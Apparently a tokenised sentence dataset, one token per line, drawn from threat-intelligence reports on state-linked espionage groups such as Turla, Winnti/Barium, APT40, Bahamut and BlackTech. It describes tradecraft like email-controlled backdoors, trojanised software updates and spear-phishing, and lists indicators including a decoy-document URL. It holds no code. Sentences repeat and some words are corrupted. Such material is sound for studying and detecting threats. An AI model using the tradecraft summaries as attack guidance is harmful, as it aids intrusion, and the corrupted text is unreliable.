exfiltrated
data
from
the
victims
.
 
It
mainly
targets
Microsoft
Outlook
,
a
widely
used
mail
client
,
but
also
targets
The
Bat!
,
a
mail
client
very
popular
in
Eastern
Europe
.
 
First
,
Turla
steals
emails
by
forwarding
all
outgoing
emails
to
the
attackers
.
 
We
identified
several
European
governments
and
defense
companies
compromised
with
this
group
.
 
What
actually
happens
is
that
the
malware
is
able
to
decode
data
from
the
PDF
documents
and
interpret
it
as
commands
for
the
backdoor
.
 
In
early
2018
,
multiple
media
claimed
that
Turla
operators
used
mail
attachments
to
control
infected
machines
.
 
As
detailed
in
the
previous
section
,
this
malware
is
able
to
manipulate
and
exfiltrate
emails
.
 
To
our
knowledge
,
Turla
is
the
only
espionage
group
that
currently
uses
a
backdoor
entirely
controlled
by
emails
,
and
more
specifically
via
PDF
attachments
.
 
The
attackers
first
infected
in
March
2017
.
 
Our
research
shows
that
compromised
organizations
are
at
risk
of
not
only
being
spied
on
by
the
Turla
group
who
planted
the
backdoor
,
but
also
by
other
attackers
.
 
The
developers
refer
to
this
tool
by
the
name
Kazuar
,
which
is
a
Trojan
written
using
the
Microsoft.NET
Framework
that
offers
actors
complete
access
to
compromised
systems
targeted
by
its
operator
.
 
We
suspect
the
Kazuar
tool
may
be
linked
to
the
Turla
threat
actor
group
(
also
known
as
Uroburos
and
Snake
)
,
who
have
been
reported
to
have
compromised
embassies
,
defense
contractors
,
educational
institutions
,
and
research
organizations
across
the
globe
.
 
This
is
also
a
full-featured
backdoor
controlled
by
email
,
and
which
can
work
independently
of
any
other
Turla
component
.
 
A
hallmark
of
Turla
operations
is
iterations
of
their
tools
and
code
lineage
in
Kazuar
can
be
traced
back
to
at
least
2005
.
 
If
the
hypothesis
is
correct
and
the
Turla
threat
group
is
using
Kazuar
,
we
believe
they
may
be
using
it
as
a
replacement
for
Carbon
and
its
derivatives
.
 
We
used
a
combination
of
tools
such
as
NoFuserEx
,
ConfuserEx
Fixer
,
ConfuserEx
Switch
Killer
,
and
de4d0t
in
order
to
deobfuscate
the
code
for
in
depth
analysis
.
 
Kazuar
generates
its
mutex
by
using
a
process
that
begins
with
obtaining
the
MD5
hash
of
a
string
"
[username]=>singleton-instance-mutex
"
.
 
The
subject
is
a
series
of
targeted
attacks
against
private
companies
.
 
e
uncovered
the
activity
of
a
hacking
group
which
has
Chinese
origins
.
 
Also
,
by
creating
this
type
of
API
access
,
Turla
could
use
one
accessible
server
as
a
single
point
to
dump
data
to
and
exfiltrate
data
from
.
 
According
to
our
estimations
,
this
group
has
been
active
for
several
years
and
specializes
in
cyberattacks
against
the
online
video
game
industry
.
 
Based
on
our
analysis
,
we
believe
that
threat
actors
may
compile
Windows
and
Unix
based
payloads
using
the
same
code
to
deploy
Kazuar
against
both
platforms
.
 
The
group
's
main
objective
is
to
steal
source
codes
.
 
In
2010
HBGary
investigated
an
information
security
incident
related
to
the
Winnti
group
at
one
of
HBGary
's
customers
an
American
video
game
company
.
 
In
2010
US-based
HBGary
investigated
an
information
security
incident
related
to
the
Winnti
group
at
one
of
HBGary
's
customers
an
American
video
game
company
.
 
For
a
long
time
the
Winnti
group
had
been
considered
as
a
Chinese
threat
actor
targeting
gaming
companies
specifically
.
 
In
April
Novetta
released
its
excellent
report
on
the
Winnti
malware
spotted
in
the
operations
of
Axiom
group
.
 
The
Axiom
group
has
been
presented
as
an
advanced
Chinese
threat
actor
carrying
out
cyber-espionage
attacks
against
a
whole
range
of
different
industries
.
 
this
library
includes
two
drivers
compiled
on
August
22
and
September
4
,
2014
.
 
Also
our
visibility
as
a
vendor
does
not
cover
every
company
in
the
world
(
at
least
so
far
;
)
)
and
the
Kaspersky
Security
Network
(
KSN
)
did
not
reveal
other
attacks
except
those
against
gaming
companies
.
 
Conversely
,
LokiBot
and
Agent
Tesla
are
new
malware
tools
.
 
Based
on
multiple
active
compromises
by
the
Axiom
threat
group
,
Novetta
was
able
to
capture
and
analyze
new
Winnti
malware
samples
.
 
Initial
attack
targets
are
commonly
software
and
gaming
organizations
in
United
States
,
Japan
,
South
Korea
,
and
China
.
 
Initial
attack
targets
are
commonly
software
and
gaming
organizations
in
United
States
,
Japan
,
South
Korea
,
and
China
.
 
The
samples
Novetta
obtained
from
the
active
Axiom
infection
were
compiled
in
mid-
to
late
2014
and
represent
what
Novetta
is
referring
to
as
version
3.0
of
the
Winnti
lineage
.
 
We
assess
with
high
confidence
that
the
Winnti
umbrella
is
associated
with
the
Chinese
state
intelligence
apparatus
,
with
at
least
some
elements
located
in
the
Xicheng
District
of
Beijing
.
 
The
Winnti
umbrella
continues
to
operate
highly
successfully
in
2018
.
 
The
Winnti
umbrella
and
closely
associated
entities
has
been
active
since
at
least
2009
.
 
The
Winnti
and
Axiom
group
names
were
created
by
Kaspersky
Lab
and
Symantec
,
respectively
,
for
their
2013/2014
reports
on
the
original
group
.
 
Their
operations
against
gaming
and
technology
organizations
are
believed
to
be
economically
motivated
in
nature
.
 
However
,
based
on
the
findings
shared
in
this
report
we
assess
with
high
confidence
that
the
actor
's
primary
long-term
mission
is
politically
focused
.
 
The
Winnti
umbrella
and
linked
groups'
initial
targets
are
gaming
studios
and
high
tech
businesses
.
 
During
the
same
time
period
,
we
also
observed
the
actor
using
the
Browser
Exploitation
Framework
(
BeEF
)
to
compromise
victim
hosts
and
download
Cobalt
Strike
.
 
In
this
campaign
,
the
attackers
experimented
with
publicly
available
tooling
for
attack
operations
.
 
The
primary
goal
of
these
attacks
was
likely
to
find
code-signing
certificates
for
signing
future
malware
.
 
The
Chinese
intelligence
apparatus
has
been
reported
on
under
many
names
,
including
Winnti
,
PassCV
,
APT17
,
Axiom
,
LEAD
,
Barium
,
Wicked
Panda
,
and
GREF
.
 
The
attackers
behind
observed
activity
in
2018
operate
from
the
Xicheng
District
of
Beijing
via
the
net
block
221.216.0.0/13
.
 
ALLANITE
activity
closely
resembles
Palmetto
Fusion
described
by
the
US
Department
of
Homeland
Security
(
DHS
)
.
 
ALLANITE
activity
closely
resembles
Palmetto
Fusion
described
by
the
US
Department
of
Homeland
Security
.
 
ALLANITE
uses
email
phishing
campaigns
and
compromised
websites
called
watering
holes
to
steal
credentials
and
gain
access
to
target
networks
,
including
collecting
and
distributing
screenshots
of
industrial
control
systems
.
 
In
October
2017
,
a
DHS
advisory
documented
ALLANITE
technical
operations
combined
with
activity
with
a
group
Symantec
calls
Dragonfly
(
which
Dragos
associates
with
DYMALLOY
)
.
 
In
October
2017
,
a
DHS
advisory
documented
ALLANITE
technical
operations
combined
with
activity
with
a
group
.
 
We
assess
with
high
confidence
that
the
attackers
discussed
here
are
associated
with
the
Chinese
state
intelligence
apparatus
.
 
ALLANITE
operations
limit
themselves
to
information
gathering
and
have
not
demonstrated
any
disruptive
or
damaging
capabilities
.
 
In
October
2017
,
a
DHS
advisory
documented
ALLANITE
technical
operations
combined
with
activity
with
a
group
Symantec
calls
Dragonfly
.
 
Public
disclosure
by
third-parties
,
including
the
DHS
,
associate
ALLANITE
operations
with
Russian
strategic
interests
.
 
ALLANITE
conducts
malware-less
operations
primarily
leveraging
legitimate
and
available
tools
in
the
Windows
operating
system
.
 
Dragos
does
not
publicly
describe
ICS
activity
group
technical
details
except
in
extraordinary
circumstances
in
order
to
limit
tradecraft
proliferation
.
 
However
,
full
details
on
ALLANITE
and
other
group
tools
,
techniques
,
procedures
,
and
infrastructure
is
available
to
network
defenders
via
Dragos
WorldView
.
 
In
addition
to
maritime
operations
in
this
region
,
Anchor
Panda
also
heavily
targeted
western
companies
in
the
US
,
Germany
,
Sweden
,
the
UK
,
and
Australia
,
and
other
countries
involved
in
maritime
satellite
systems
,
aerospace
companies
,
and
defense
contractors
.
 
A
current
round
of
cyber-attacks
from
Chinese
source
groups
are
targeting
the
maritime
sector
in
an
attempt
to
steal
technology
.
 
PLA
Navy
Anchor
Panda
is
an
adversary
that
CrowdStrike
has
tracked
extensively
over
the
last
year
targeting
both
civilian
and
military
maritime
operations
in
the
green/brown
water
regions
primarily
in
the
LOC
of
operations
of
the
South
Sea
Fleet
of
the
PLA
Navy
.
 
ALLANITE
operations
continue
and
intelligence
indicates
activity
since
at
least
May
2017
.
 
APT
Anchor
Panda
is
a
Chinese
threat
actor
group
who
target
maritime
operations
.
 
According
to
cyber
security
researchers
,
Anchor
Panda
,
who
work
directly
for
the
Chinese
PLA
Navy
,
likely
remains
active
.
 
Dragos
does
not
corroborate
nor
conduct
political
attribution
to
threat
activity
.
 
In
the
past
they
used
Adobe
Gh0st
,
Poison
Ivy
and
Torn
RAT
malware
as
their
primary
attack
vector
is
sphere
phishing
.
 
Their
targets
are
marine
companies
that
operate
in
and
around
the
South
China
Sea
,
an
LOC
of
much
Chinese
interest
.
 
As
recently
as
this
past
week
,
researchers
observed
Chinese
hackers
escalating
cyber-attack
efforts
to
steal
military
research
secrets
from
US
universities
.
 
The
cyber-espionage
campaign
has
labelled
the
group
Advanced
Persistent
Threat
(
APT
)
40
or
,
titled
,
Periscope
.
 
The
group
has
been
active
since
at
least
January
2013
.
 
The
group
has
also
targeted
businesses
operating
in
the
South
China
Sea
,
which
is
a
strategically
important
region
and
the
focus
of
disputes
between
China
and
other
states
.
 
The
main
targets
seem
to
be
US
companies
in
engineering
,
transport
and
defense
,
although
it
has
targeted
other
organizations
around
the
world
.
 
The
times
of
day
the
group
is
active
also
suggests
that
it
is
based
near
Beijing
and
the
group
has
reportedly
used
malware
that
has
been
observed
in
other
Chinese
operations
,
indicating
some
level
of
collaboration
.
 
Periscope
's
activity
has
previously
been
suspected
of
being
linked
to
China
,
but
now
researchers
believe
their
evidence
links
the
operation
to
the
Chinese
state
.
 
APT40
is
described
as
a
moderately
sophisticated
cyber-espionage
group
which
combines
access
to
significant
development
resources
with
the
ability
to
leverage
publicly
available
tools
.
 
Anchor
Panda
uses
website
and
web-server
compromise
as
a
means
of
attack
and
leverages
an
enormous
cache
of
tools
in
its
campaigns
,
to
include
exploits
that
take
advantage
of
known
CVE
software
vulnerabilities
.
 
Like
many
espionage
campaigns
,
much
of
APT40
's
activity
begins
by
attempting
to
trick
targets
with
phishing
emails
,
before
deploying
malware
such
as
the
Gh0st
RAT
trojan
to
maintain
persistence
on
a
compromised
network
.
 
The
group
uses
website
and
web-server
compromise
as
a
means
of
attack
and
leverages
an
enormous
cache
of
tools
in
its
campaigns
,
to
include
exploits
that
take
advantage
of
known
CVE
software
vulnerabilities
.
 
More
than
half
of
the
organizations
we
have
observed
being
targeted
or
breached
by
APT5
operate
in
these
sectors
.
 
APT5
has
been
active
since
at
least
2007
.
 
APT5
has
targeted
or
breached
organizations
across
multiple
industries
,
but
its
focus
appears
to
be
on
telecommunications
and
technology
companies
,
especially
information
about
satellite
communications
.
 
APT5
targeted
the
network
of
an
electronics
firm
that
sells
products
for
both
industrial
and
military
applications
.
 
The
group
subsequently
stole
communications
related
to
the
firm
's
business
relationship
with
a
national
military
,
including
inventories
and
memoranda
about
specific
products
they
provided
.
 
In
one
case
in
late
2014
,
APT5
breached
the
network
of
an
international
telecommunications
company
.
 
The
group
used
malware
with
keylogging
capabilities
to
monitor
the
computer
of
an
executive
who
manages
the
company
's
relationships
with
other
telecommunications
companies
.
 
APT5
also
targeted
the
networks
of
some
of
Southeast
Asia
's
major
telecommunications
providers
with
Leouncia
malware
.
 
We
suspect
that
the
group
sought
access
to
these
networks
to
obtain
information
that
would
enable
it
to
monitor
communications
passing
through
the
providers'
systems
.
 
The
FBI
said
the
"
group
of
malicious
cyber
actors
"
(
known
as
APT6
or
1.php
)
used
dedicated
top-level
domains
in
conjunction
with
the
command
and
control
servers
to
deliver
"
customized
malicious
software
"
to
government
computer
systems
.
 
Deepen
told
Threatpost
the
group
has
been
operating
since
at
least
since
2008
and
has
targeted
China
and
US
relations
experts
,
Defense
Department
entities
,
and
geospatial
groups
within
the
federal
government
.
 
Government
officials
said
they
knew
the
initial
attack
occurred
in
2011
,
but
are
unaware
of
who
specifically
is
behind
the
attacks
.
 
According
to
Deepen
,
APT6
has
been
using
spear
phishing
in
tandem
with
malicious
PDF
and
ZIP
attachments
or
links
to
malware
infected
websites
that
contains
a
malicious
SCR
file
.
 
Nearly
a
month
later
,
security
experts
are
now
shining
a
bright
light
on
the
alert
and
the
mysterious
group
behind
the
attack
.
 
The
attacks
discussed
in
this
blog
are
related
to
an
APT
campaign
commonly
referred
to
as
"
th3bug
"
,
named
for
the
password
the
actors
often
use
with
their
Poison
Ivy
malware
.
 
Over
the
summer
they
compromised
several
sites
,
including
a
well-known
Uyghur
website
written
in
that
native
language
.
 
In
contrast
to
many
other
APT
campaigns
,
which
tend
to
rely
heavily
on
spear
phishing
to
gain
victims
,
"
th3bug
"
is
known
for
compromising
legitimate
websites
their
intended
visitors
are
likely
to
frequent
.
 
While
we
were
unable
to
recover
the
initial
vulnerability
used
,
it
is
possibly
the
same
CVE-2014-0515
Adobe
Flash
exploit
first
reported
by
Cisco
TRAC
in
late
July
.
 
However
,
to
increase
success
rates
APT20
can
use
zero-day
exploits
,
so
even
a
properly
patched
system
would
be
compromised
.
 
Our
direct
observation
of
in-the-wild
spearphishing
attacks
staged
by
the
Bahamut
group
have
been
solely
attempts
to
deceive
targets
into
providing
account
passwords
through
impersonation
of
notices
from
platform
providers
.
 
Bahamut
was
first
noticed
when
it
targeted
a
Middle
Eastern
human
rights
activist
in
the
first
week
of
January
2017
.
 
Later
that
month
,
the
same
tactics
and
patterns
were
seen
in
attempts
against
an
Iranian
women
's
activist
an
individual
commonly
targeted
by
Iranian
actors
,
such
as
Charming
Kitten
and
the
Sima
campaign
documented
in
our
2016
Black
Hat
talk
.
 
In
June
we
published
on
a
previously
unknown
group
we
named
"
Bahamut
"
,
a
strange
campaign
of
phishing
and
malware
apparently
focused
on
the
Middle
East
and
South
Asia
.
 
Once
inside
a
network
,
APT40
uses
credential-harvesting
tools
to
gain
usernames
and
passwords
,
allowing
it
to
expand
its
reach
across
the
network
and
move
laterally
through
an
environment
as
it
moves
to
towards
the
ultimate
goal
of
stealing
data
.
 
Bahamut
was
shown
to
be
resourceful
,
not
only
maintaining
their
own
Android
malware
but
running
propaganda
sites
,
although
the
quality
of
these
activities
varied
noticeably
.
 
In
June
we
published
on
a
previously
unknown
group
we
named
"
Bahamut
"
,
a
strange
campaign
of
phishing
and
malware
apparently
focused
on
the
Middle
East
and
South
Asia
.
 
Several
times
,
APT5
has
targeted
organizations
and
personnel
based
in
Southeast
Asia
.
 
However
,
in
the
same
week
of
September
a
series
of
spearphishing
attempts
once
again
targeted
a
set
of
otherwise
unrelated
individuals
,
employing
the
same
tactics
as
before
.
 
Our
primary
contribution
in
this
update
is
to
implicate
Bahamut
in
what
are
likely
counterterrorism-motivated
surveillance
operations
,
and
to
further
affirm
our
belief
that
the
group
is
a
hacker-for-hire
operation
.
 
As
we
wrote
then
,
compared
to
Kingphish
,
Bahamut
operates
as
though
it
were
a
generation
ahead
in
terms
of
professionalism
and
ambition
.
 
In
the
Bahamut
report
,
we
discussed
two
domains
found
within
our
search
that
were
linked
with
a
custom
Android
malware
agent
.
 
After
the
publication
of
the
original
report
,
these
sites
were
taken
offline
despite
the
fact
that
one
agent
was
even
updated
a
six
days
prior
to
our
post
(
the
"
Khuai
"
application
)
.
 
FIF
is
notable
for
its
links
to
the
Lashkar-e-Taiba
(
LeT
)
terrorist
organization
,
which
has
committed
mass-casualty
attacks
in
India
in
support
of
establishing
Pakistani
control
over
the
disputed
Jammu
and
Kashmir
border
region
.
 
As
a
result
,
it
is
already
flagged
as
Bahamut
by
antivirus
engines
.
 
Our
initial
observation
of
the
Bahamut
group
originated
from
in-the-wild
attempts
to
deceive
targets
into
providing
account
passwords
through
impersonation
of
platform
providers
.
 
One
curious
trait
of
Bahamut
is
that
it
develops
fully-functional
applications
in
support
of
its
espionage
activities
,
rather
than
push
nonfunctional
fake
apps
or
bundle
malware
with
legitimate
software
.
 
Curiously
,
Bahamut
appears
to
track
password
attempts
in
response
to
failed
phishing
attempts
or
to
provoke
the
target
to
provide
more
passwords
.
 
Bahamut
spearphishing
attempts
have
also
been
accompanied
with
SMS
messages
purporting
to
be
from
Google
about
security
issues
on
their
account
,
including
a
class
0
message
or
"
Flash
text
"
.
 
These
text
messages
did
not
include
links
but
are
intended
to
build
credibility
around
the
fake
service
notifications
later
sent
to
the
target
's
email
address
.
 
We
have
not
found
evidence
of
Bahamut
engaging
in
crime
or
operating
outside
its
limited
geographic
domains
,
although
this
narrow
perspective
could
be
accounted
for
by
its
compartmentalization
of
operations
.
 
Thus
far
,
Bahamut
's
campaigns
have
appeared
to
be
primarily
espionage
or
information
operations
not
destructive
attacks
or
fraud
.
 
The
targets
and
themes
of
Bahamut
's
campaigns
have
consistently
fallen
within
two
regions
South
Asia
(
primarily
Pakistan
,
specifically
Kashmir
)
and
the
Middle
East
(
from
Morocco
to
Iran
)
.
 
Our
prior
publication
also
failed
to
acknowledge
immensely
valuable
input
from
a
number
of
colleagues
,
including
Nadim
Kobeissi
's
feedback
on
how
the
API
endpoints
on
the
Android
malware
were
encrypted
.
 
Bahamut
targeted
similar
Qatar-based
individuals
during
their
campaign
.
 
Bellingcat
also
reported
the
domain
had
been
used
previously
to
host
potential
decoy
documents
as
detailed
in
VirusTotal
here
using
http://voguextra.com/decoy.doc
.
 
The
China-backed
Barium
APT
is
suspected
to
be
at
the
helm
of
the
project
.
 
Trojanized
versions
of
the
utility
were
then
signed
with
legitimate
certificates
and
were
hosted
on
and
distributed
from
official
ASUS
update
servers
which
made
them
mostly
invisible
to
the
vast
majority
of
protection
solutions
,
according
to
Kaspersky
Lab
.
 
Kaspersky
Lab
To
compromise
the
utility
,
Kaspersky
Lab
determined
that
the
cyberattackers
used
stolen
digital
certificates
used
by
ASUS
to
sign
legitimate
binaries
,
and
altered
older
versions
of
ASUS
software
to
inject
their
own
malicious
code
.
 
To
compromise
the
utility
,
Kaspersky
Lab
determined
that
Barium
used
stolen
digital
certificates
used
by
ASUS
to
sign
legitimate
binaries
,
and
altered
older
versions
of
ASUS
software
to
inject
their
own
malicious
code
.
 
BARIUM
,
a
Chinese
state
player
that
also
goes
by
APT17
,
Axiom
and
Deputy
Dog
,
was
previously
linked
to
the
ShadowPad
and
CCleaner
incidents
,
which
were
also
supply-chain
attacks
that
used
software
updates
to
sneak
onto
machines
.
 
That
said
,
the
"
fingerprints
"
left
on
the
samples
by
the
attackers
including
techniques
used
to
achieve
unauthorized
code
execution
suggest
that
the
BARIUM
APT
is
behind
the
effort
,
according
to
the
researchers
.
 
In
the
2017
ShadowPad
attack
,
the
update
mechanism
for
Korean
server
management
software
provider
NetSarang
was
compromised
to
serve
up
an
eponymous
backdoor
.
 
In
the
next
incident
,
also
in
2017
,
software
updates
for
the
legitimate
computer
cleanup
tool
CCleaner
was
found
to
have
been
compromised
by
hackers
to
taint
them
with
the
same
ShadowPad
backdoor
.
 
NetSarang
,
which
has
headquarters
in
South
Korea
and
the
United
States
,
removed
the
backdoored
update
,
but
not
before
it
was
activated
on
at
least
one
victim
's
machine
in
Hong
Kong
.
 
Given
our
increased
confidence
that
Bahamut
was
responsible
for
targeting
of
Qatari
labor
rights
advocates
and
its
focus
on
the
foreign
policy
institutions
other
Gulf
states
,
Bahamut
's
interests
are
seemingly
too
expansive
to
be
limited
one
sponsor
or
customer
.
 
Barium
specializes
in
targeting
high
value
organizations
holding
sensitive
data
,
by
gathering
extensive
information
about
their
employees
through
publicly
available
information
and
social
media
,
using
that
information
to
fashion
phishing
attacks
intended
to
trickthose
employees
into
compromising
their
computers
and
networks
.
 
We
identified
an
overlap
in
the
domain
voguextra.com
,
which
was
used
by
Bahamut
within
their
"
Devoted
To
Humanity
"
app
to
host
an
image
file
and
as
C2
server
by
the
PrayTime
iOS
app
mentioned
in
our
first
post
.
 
Althoughthe
BariumDefendants
have
relied
on
differentand
distinct
infrastructures
in
an
effortto
evade
detection
,
Bariumused
the
same
e-mail
address
(
hostay88@gmail.com
)
to
register
malicious
domains
used
in
connection
with
at
least
two
toolsets
that
Barium
has
employed
to
compromise
victim
computers
.
 
The
second
method
,
described
in
Part
D.2
,
below
,
involves
the
"
ShadowPad
"
malware
,
which
the
Barium
Defendants
have
distributed
via
a
third-party
software
provider
's
compromised
update
.
 
To
enhance
the
effectiveness
of
phishing
attacks
into
the
organization
,
Barium
will
collect
additional
background
informationfrom
social
media
sites
.
 
Employing
a
technique
known
as
"
spear
phishing
"
,
Barium
has
heavily
targeted
individuals
within
HumanResources
or
Business
Developmentdepartments
ofthe
targeted
organizations
in
order
to
compromise
the
computers
ofsuch
individuals
.
 
The
first
method
,
described
in
Part
D.l
,
below
,
involves
the
"
Barlaiy
"
and
"
PlugXL
"
malware
,
which
the
Barium
Defendants
propagate
using
phishing
techniques
.
 
Using
the
information
gathered
from
its
reconnaissance
on
social
media
sites
,
Barium
packages
the
phishing
e-mail
in
a
ACT
that
gives
the
e-mail
credibility
to
the
target
user
,
often
by
making
the
e-mail
appear
as
ifit
were
sent
from
an
organization
known
to
and
trusted
by
the
victim
or
concerning
a
topic
of
interest
to
the
victim
.
 
Barium
Defendants
install
the
malicious
"
Win32/Barlaiy
"
malware
and
the
malicious
"
Win32/PlugX.L
"
malware
on
victim
computers
using
the
means
described
above
.
 
Both
Win32/Barlaiy
&
Win32/PlugX.L
are
remote
access
"
trojans
"
,
which
allow
Barium
to
gather
a
victim
's
information
,
control
a
victim
's
device
,
install
additional
malware
,
and
exfiltrate
information
fi-om
a
victim
's
device
.
 
Barium
Defendants
install
the
malicious
credential
stealing
and
injection
tool
known
as
"
Win32/RibDoor.A!dha
"
.
 
While
not
detected
at
the
time
,
Microsoft
's
antivirus
and
security
products
now
detect
this
Barium
malicious
file
and
flag
the
file
as
"
Win32/ShadowPad.A
"
.
 
MXI
Player
appears
to
be
a
version
of
the
Bahamut
agent
,
designed
to
record
the
phone
calls
and
collect
other
information
about
the
user
(
com.mxi.videoplay
)
.
 
Figure
9a
,
below
,
shows
detections
of
encounters
with
the
Barium
actors
and
their
infrastructure
,
including
infected
computers
located
in
Virginia
,
and
Figure
9b
,
below
,
shows
detections
of
encounters
throughout
the
United
States
.
 
Barium
has
targeted
Microsoft
customers
both
in
Virginia
,
the
United
States
,
and
around
the
world
.
 
Once
the
Barium
Defendants
have
access
to
a
victim
computer
through
the
malware
described
above
,
they
monitor
the
victim
's
activity
and
ultimately
search
for
and
steal
sensitive
documents
(
for
example
,
Exfiltration
of
intellectual
property
regarding
technology
has
been
seen
)
,
and
personal
information
fi"om
the
victim
's
network
.
 
According
to
a
49-page
report
published
Thursday
,
all
of
the
attacks
are
the
work
of
Chinese
government
's
intelligence
apparatus
,
which
the
report
's
authors
dub
the
Winnti
Umbrella
.
 
Researchers
from
various
security
organizations
have
used
a
variety
of
names
to
assign
responsibility
for
the
hacks
,
including
LEAD
,
BARIUM
,
Wicked
Panda
,
GREF
,
PassCV
,
Axiom
,
and
Winnti
.
 
It
targets
organizations
in
Japan
,
South
Korea
,
and
Taiwan
,
leveling
its
attacks
on
public
sector
agencies
and
telecommunications
and
other
high-technology
industries
.
 
In
2016
,
for
instance
,
we
found
their
campaigns
attacking
Japanese
organizations
with
various
malware
tools
,
notably
the
Elirks
backdoor
.
 
Blackgear
has
been
targeting
various
industries
since
its
emergence
a
decade
ago
.
 
Blackgear
's
campaigns
also
use
email
as
an
entry
point
,
which
is
why
it's
important
to
secure
the
email
gateACT
.
 
BLACKGEAR
is
an
espionage
campaign
which
has
targeted
users
in
Taiwan
for
many
years
.
 
Our
research
indicates
that
it
has
started
targeting
Japanese
users
.
 
The
malware
tools
used
by
BLACKGEAR
can
be
categorized
into
three
categories
:
binders
,
downloaders
and
backdoors
.
 
Binders
are
delivered
by
attack
vectors
(
such
as
phishing
and
watering
hole
attacks
)
onto
a
machine
.
 
Based
on
the
mutexes
and
domain
names
of
some
of
their
C&C
servers
,
BlackTech
's
campaigns
are
likely
designed
to
steal
their
target
's
technology
.
 
Following
their
activities
and
evolving
tactics
and
techniques
helped
us
uncover
the
proverbial
red
string
of
fate
that
connected
three
seemingly
disparate
campaigns
:
PLEAD
,
Shrouded
Crossbow
,
and
of
late
,
Waterbear
.
 
Active
since
2012
,
it
has
so
far
targeted
Taiwanese
government
agencies
and
private
organizations
.
 
PLEAD
uses
spear-phishing
emails
to
deliver
and
install
their
backdoor
,
either
as
an
attachment
or
through
links
to
cloud
storage
services
.
 
PLEAD
also
dabbled
with
a
short-lived
,
fileless
version
of
their
malware
when
it
obtained
an
exploit
for
a
Flash
vulnerability
(
CVE-2015-5119
)
that
was
leaked
during
the
Hacking
Team
breach
.
 
PLEAD
also
uses
CVE-2017-7269
,
a
buffer
overflow
vulnerability
Microsoft
Internet
Information
Services
(
IIS
)
6.0
to
compromise
the
victim
's
server
.
 
This
campaign
,
first
observed
in
2010
,
is
believed
to
be
operated
by
a
well-funded
group
given
how
it
appeared
to
have
purchased
the
source
code
of
the
BIFROST
backdoor
,
which
the
operators
enhanced
and
created
other
tools
from
.
 
Shrouded
Crossbow
targeted
privatized
agencies
and
government
contractors
as
well
as
enterprises
in
the
consumer
electronics
,
computer
,
healthcare
,
and
financial
industries
.
 
Shrouded
Crossbow
employs
three
BIFROST-derived
backdoors
:
BIFROSE
,
KIVARS
,
and
XBOW
.
 
Like
PLEAD
,
Shrouded
Crossbow
uses
spear-phishing
emails
with
backdoor-laden
attachments
that
utilize
the
RTLO
technique
and
accompanied
by
decoy
documents
.
 
XBOW
's
capabilities
are
derived
from
BIFROSE
and
KIVARS
;
Shrouded
Crossbow
gets
its
name
from
its
unique
mutex
format
.
 
While
PLEAD
and
KIVARS
are
most
likely
to
be
used
in
first
phase
attacks
,
Waterbear
can
be
seen
as
a
secondary
backdoor
installed
after
attackers
have
gained
a
certain
level
of
privilege
.
 
Recently
,
the
JPCERT
published
a
thorough
analysis
of
the
Plead
backdoor
,
which
,
according
to
Trend
Micro
,
is
used
by
the
cyberespionage
group
BlackTech
.
 
Despite
the
fact
that
the
Changing
Information
Technology
Inc.
certificate
was
revoked
on
July
4
,
2017
,
the
BlackTech
group
is
still
using
it
to
sign
their
malicious
tools
.
 
The
BlackTech
group
is
primarily
focused
on
cyberespionage
in
Asia
.
 
The
new
activity
described
in
this
blogpost
was
detected
by
ESET
in
Taiwan
,
where
the
Plead
malware
has
alACTs
been
most
actively
deployed
.
 
Attackers
are
targeting
Windows
platform
and
aiming
at
government
institutions
as
well
as
big
companies
in
Colombia
.
 
Attackers
like
to
use
spear-fishing
email
with
password
protected
RAR
attachment
to
avoid
being
detected
by
the
email
gateACT
.
 
The
first
sample
being
captured
was
in
April
2018
and
since
that
we
observed
a
lot
more
related
ones
.
 
After
performing
investigations
on
the
classified
victims
,
we
find
the
attacker
targets
big
companies
and
government
agencies
in
Colombia
.
 
After
monitoring
and
correlating
the
APT
attack
,
360
Threat
Intelligence
Center
discovered
multiple
related
emails
to
attack
Colombian
government
agencies
,
financial
institutions
and
large
enterprises
.
 
The
oldest
sample
we've
seen
up
to
now
is
from
November
2013
.
 
One
of
the
top
targets
is
the
Japan
Pension
Service
,
but
the
list
of
targeted
industries
includes
government
and
government
agencies
,
local
governments
,
public
interest
groups
,
universities
,
banks
,
financial
services
,
energy
and
so
on
.
 
However
,
the
attack
is
different
in
two
respects
:
unlike
other
APTs
,
the
main
focus
of
Blue
Termite
is
to
attack
Japanese
organizations
;
and
most
of
their
C2s
are
located
in
Japan
.
 
Originally
,
the
main
infection
vector
of
Blue
Termite
was
spear-phishing
emails
.
 
Kaspersky
Lab
has
detected
a
new
method
of
first
infection
that
uses
a
drive-by-download
with
a
flash
exploit
(
CVE-2015-5119
,
the
one
leaked
from
The
Hacking
Team
incident
)
.
 
Kaspersky
Lab
also
found
some
watering
hole
attacks
,
including
one
on
a
website
belonging
to
a
prominent
member
of
the
Japanese
government
.
 
In
early
July
2015
,
however
,
Kaspersky
Lab
found
a
sample
that
creates
a
decryption
key
with
Salt1
,
Salt2
,
and
Salt3
.
 
From
early
June
,
when
the
cyber-attack
on
the
Japan
Pension
Service
started
to
be
reported
widely
,
various
Japanese
organizations
would
have
started
to
deploy
protection
measures
.
 
It
employs
AES
in
addition
to
SID
tricks
,
making
it
difficult
to
decrypt
sensitive
data
.
 
In
order
to
fight
back
against
this
cyber-espionage
,
Kaspersky
Lab
will
continue
its
research
.
 
Bookworm
's
functional
code
is
radically
different
from
PlugX
and
has
a
rather
unique
modular
architecture
that
warranted
additional
analysis
by
Unit
42
.
 
Bookworm
has
little
malicious
functionality
built-in
,
with
its
only
core
ability
involving
stealing
keystrokes
and
clipboard
contents
.
 
The
Plead
malware
is
a
backdoor
which
,
according
to
Trend
Micro
,
is
used
by
the
BlackTech
group
in
targeted
attacks
.
 
So
far
,
it
appears
threat
actors
have
deployed
the
Bookworm
Trojan
primarily
in
attacks
on
targets
in
Thailand
.
 
The
threat
actors
use
a
commercial
installation
tool
called
Smart
Installer
Maker
to
encapsulate
and
execute
a
self-extracting
RAR
archive
and
in
some
cases
a
decoy
slideshow
or
Flash
installation
application
.
 
The
self-extracting
RAR
writes
a
legitimate
executable
,
an
actor-created
DLL
called
Loader.dll
and
a
file
named
readme.txt
to
the
filesystem
and
then
executes
the
legitimate
executable
.
 
targeted
attacks
.
 
Using
XREFs
during
static
analysis
is
a
common
technique
to
quickly
find
where
functions
of
interest
are
called
.
 
The
developers
designed
Bookworm
to
be
a
modular
Trojan
not
limited
to
just
the
initial
architecture
of
the
Trojan
,
as
Bookworm
can
also
load
additional
modules
provided
by
the
C2
server
.
 
Although
the
developers
of
Bookworm
have
included
only
keylogging
functionality
in
Bookworm
as
a
core
ability
,
as
suggested
in
Table
1
,
several
of
the
embedded
DLLs
provide
Leader
with
